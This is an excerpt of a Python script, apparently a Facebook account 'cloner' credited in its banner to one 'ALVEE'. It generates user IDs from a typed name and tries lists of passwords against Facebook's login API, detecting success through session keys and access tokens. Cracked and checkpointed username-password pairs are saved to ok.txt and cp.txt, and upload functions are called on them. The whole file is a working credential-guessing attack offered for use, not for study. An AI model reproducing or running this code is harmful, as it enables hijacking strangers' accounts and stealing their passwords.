...
class Main:
	def __init__(self):
		...
		print ("""\033[1;92m  ALVEE ALWYAS KING
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : ALVEE CHOWDHURY   
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : GOOD VIBES
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : ARMANOFFICAL
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : BYPASS BY ALVEE
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %ALVEE❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: ALVEE): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ALVEE-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [ALVEE-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[ALVEE-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [ALVEE-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
